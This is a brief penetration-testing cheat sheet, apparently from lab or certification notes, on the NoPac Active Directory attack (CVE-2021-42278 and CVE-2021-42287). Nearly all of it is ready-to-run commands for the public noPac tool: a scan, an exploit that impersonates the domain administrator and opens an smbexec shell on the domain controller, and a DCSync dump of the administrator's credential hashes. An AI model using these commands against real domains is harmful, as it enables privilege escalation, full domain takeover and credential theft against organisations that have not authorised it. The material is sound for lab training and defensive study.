---
layout: app
title: "Active Directory"
tags: ["NoPac"]

---

# NoPac

## CVE's

* CVE-2021-42278: Bypass vulnerability with the Security Account Manager (SAM).
* CVE-2021-42287: Vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.

[noPac Tool](https://github.com/Ridter/noPac)


### scan
```bash
python scanner.py crtp.local/username:password -dc-ip 192.168.85.100 -use-ldap
```

### Exploit

```bash
sudo python3 noPac.py crtp.LOCAL/username:password -dc-ip [address]  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user crtp/administrator
```

> We will notice that a semi-interactive shell session is established with the target using smbexec.py. Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using cd.

It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use ls to confirm

### Using noPac to DCSync the Built-in Administrator Account

```bash
sudo python3 noPac.py crtp.LOCAL/username:password -dc-ip IPAddress  -dc-host HOST-NAME --impersonate administrator -use-ldap -dump -just-dc-user crtp/administrator
```
